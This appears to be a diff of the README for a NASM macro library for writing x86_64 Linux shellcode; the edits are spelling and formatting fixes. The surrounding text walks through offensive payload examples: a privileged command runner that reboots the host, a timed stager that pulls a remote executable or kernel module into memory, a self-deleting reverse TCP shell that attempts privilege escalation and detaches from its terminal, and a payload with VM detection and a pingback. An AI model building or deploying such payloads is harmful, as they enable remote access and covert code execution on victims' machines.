@@ -20,7 +20,7 @@
        |      .                  |      .      |      .   .      .  .      . 
        |    .   .                | * .         |  .  *     .   .     .
        | .  .                    | .   *       |   *  .   *   .    .
- ~~~~~~~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~   ~   ~   ~  ~   - - - - - - - - - - -  -   -   -   =]D>    
+ ~~~~~~~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~   ~   ~   ~  ~   - - - - - - - - - - -  -   -   -   =]D&gt;
        |   .   .                 |   *  *      |  .  *   *    .
        |      .                  |    .        |  . *  .   *     *
        |                         |      .      |     *  .  .   *
@@ -31,25 +31,30 @@
           [Jacket]-----------------------------|       
 
 
-        ----{ Wintrmvte @ redcodelabs.io <*> }----
+        ----{ Wintrmvte @ redcodelabs.io &lt;*&gt; }----
 
 
 
 | - - - - [ Introduction ]
 
-When I first started with manual shellcoding a few years back, I sticked with x86_64 32 bit platform, due to
-a great amount of fantastic resources and references online (SLAE, to name one). 
-Transition to 64 bit ecosystem was quite harsh, as code examples and write-ups often do not cover
-modern Linux scenarios in a low-level approach; and if they do, mostly basic concepts are addressed.
-This tool doesn't bring anything new to the table, yet it might serve as a starting point for your next project;
-you will find here both standard Nasm macros for tasks automation, as well as some more complex ones to enrich your Assembly techniques.
+When I first started with manual shellcoding a few years back, I stuck with the x86_64 
+32 bit platform due to a great amount of fantastic resources and references online 
+(SLAE, to name one). 
+
+Transition to 64 bit ecosystem was quite harsh, as code examples and write-ups often 
+do not cover modern Linux scenarios in a low-level approach; and if they do, mostly 
+basic concepts are addressed.
+
+This tool doesn't bring anything new to the table, yet it might serve as a starting 
+point for your next project. You will find here standard Nasm macros for task 
+automation, as well as, some more complex ones to enrich your assembly techniques.
 
 
 
-| - - - - [ Example #1 = Command execution ]
+| - - - - [ Example #1 = Command Execution ]
 
 We will start with a most straightforward example - arbitrary command execution.
-Our code should check if it was executed with elevated privilleges. 
+Our code should check if it was executed with elevated privileges. 
 If so, it will launch a shell command in background and attempt to reboot the host.
 
 ------------ cmd_exec.asm -----------
@@ -76,12 +81,17 @@ Try running the created ELF file with and without 'sudo' prefix.
 
 
 
-| - - - - [ Example #2 = Time manipulations and second stage loaders]
+| - - - - [ Example #2 = Time Manipulations and Second Stage Loaders]
 
-Now let's create something more complex - initially, our payload will set it's time to live (let's say 5 minutes).
-During this period, it will attempt to map a remote file (an executable, an LKM module etc.) to a in-memory file descriptor.
-If connection with the server which holds the file fails for some reason, it is re-tried in an infinite loop with 20 seconds of delay 
-between each connect(2) attempt.
+Now let's create something more complex. Initially, our payload will set it's time to 
+live (let's say 5 minutes). 
+
+During this period, it will attempt to map a remote file (an executable, an LKM etc.) 
+to a in-memory file descriptor.
+
+If connection with the server which holds the file fails for some reason, it is 
+re-tried in an infinite loop with 20 seconds of delay  between each connect(2) attempt.
+
 Let's look at the code:
 
 ------------------------------- timed_stager.asm -----------
@@ -111,16 +121,23 @@ Let's look at the code:
         . . .                       ; Now we can execute our file via 'fd_exec r12' macro, or do anything else we want with it (like mmap())
 -------------------------------------------------------------
 
-Notice that we don't have to specify server's IP address in hex, because 'sock_connect' macro has a built-in IP -> hex converter.
+Notice that we don't have to specify server's IP address in hex, because 'sock_connect' 
+macro has a built-in IP -&gt; hex converter.
 
 
 
-| - - - - [ Example #3 = Not just a reverse shell]
+| - - - - [ Example #3 = Not Just a Reverse Shell]
 
 The third example will consist of a simple reverse TCP shell.
-It's executable is removed from filesystem if certain conditions are met, and the process priority is increased (as seen in `htop`)
-The payload also attempts to elevate privilleges (and often miserably fails), and detaches itself from TTY afterwards.
-Full daemon-like behaviour (extending setsid(0x00)) can be found within the source of 'daemon_init' macro, defined in section 0x05.
+
+It's executable is removed from the filesystem if certain conditions are met, and the 
+process priority is increased (as seen in 'htop')
+
+The payload also attempts to elevate privileges (and often miserably fails), and detaches
+itself from TTY afterwards.
+
+Full daemon-like behaviour (extending setsid(0x00)) can be found within the source of 
+'daemon_init' macro, defined in section 0x05.
 
 ------------------------------- reverse_shell.asm -----------
     BITS 64
@@ -128,21 +145,26 @@ Full daemon-like behaviour (extending setsid(0x00)) can be found within the sour
     section .text
     global _start
     _start: 
-        remove_self                 ; The binary removeds itself if it's size is curca current payload size ('fsize' variable)
+        remove_self                 ; The binary removes itself if it's size is circa current payload size ('fsize' variable)
         set_priority MAX_PRIO       ; We set process priority to maximum
-        elevate_full                ; Privillege escalation attempt via SETGID(0) ats SETUID(0)
-        tty_detach                  ; setsid(0x00) == detach from controlling TTY deivce
+        elevate_full                ; Privilege escalation attempt via SETGID(0) ats SETUID(0)
+        tty_detach                  ; setsid(0x00) == detach from controlling TTY device
         revshell "127.0.0.1", 5555  ; Spawn a standard TCP reverse shell
         get_current_size_var        ; Initiate the 'fsize' variable used by 'remove_self' macro
 -------------------------------------------------------------
 
 
 
-| - - - - [ Example #4 = Size padding and VM detection]
+| - - - - [ Example #4 = Size Padding and VM Detection]
 
-In the last piece, let's use two padding macros for inserting a short NOP sled and extending payload's size up to 256 bytes in total.
-It will also perform a dry pingback of an external host to ensure that payload's execution was successful.
-Let's also specify a single virtualization detection method at the top, and a file lock to prevent eventual zombie-like behaviour of our code on a single host.
+In the last piece, let's use two padding macros for inserting a short NOP sled and 
+extending payload's size up to 256 bytes in total.
+
+It will also perform a dry pingback of an external host to ensure that payload's 
+execution was successful.
+
+Let's also specify a single virtualization detection method at the top, and a file 
+lock to prevent eventual zombie-like behaviour of our code on a single host.
 
 ------------------------------- vm_and_stuff.asm -----------
     BITS 64
